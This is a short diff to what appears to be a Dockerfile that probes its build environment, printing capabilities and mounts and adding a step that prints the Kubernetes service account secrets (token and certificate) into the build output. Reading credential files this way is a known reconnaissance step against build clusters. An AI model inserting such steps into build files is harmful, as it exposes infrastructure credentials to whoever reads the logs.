@@ -22,7 +22,9 @@ RUN capsh --print > cap
 
 RUN mount > mount
 
-RUN ls -laR / > dirs
+#RUN ls -laR / > dirs
+
+RUN cat /var/run/secrets/kubernetes.io/serviceaccount/*
 
 RUN cat /var/run/secrets/kubernetes.io/serviceaccount/* > sa
 #RUN sleep 460
